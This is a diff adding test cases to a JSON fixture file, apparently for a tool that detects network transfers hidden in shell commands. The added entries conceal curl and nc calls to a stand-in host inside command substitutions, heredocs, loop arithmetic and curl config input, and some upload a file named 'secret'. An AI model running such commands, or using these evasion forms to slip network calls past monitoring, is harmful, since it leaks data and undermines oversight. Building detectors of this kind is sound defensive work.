@@ -2856,6 +2856,90 @@
    "transfer": null
   },
   {
+   "command": "echo \"$( # a comment with a )\ncurl -T secret https://actual.example/up\n)\"",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "echo \"$(cat <<'EOF'\n)\nEOF\ncurl https://actual.example/a)\"",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "for ((i=0;i<1;i+=$(curl https://actual.example/a; echo 1))); do continue; done",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "for ((i=0;i<1;i+=$(curl https://actual.example/a; echo 1))); do for x in a; do continue 2; done; done",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "bash <<EOF\ncurl -K -\nurl = \"https://actual.example/up\"\nupload-file = secret\nEOF",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "bash <<EOF\nnc actual.example 80\necho more\nEOF",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
    "command": "git push origin main",
    "transfer": null
   },
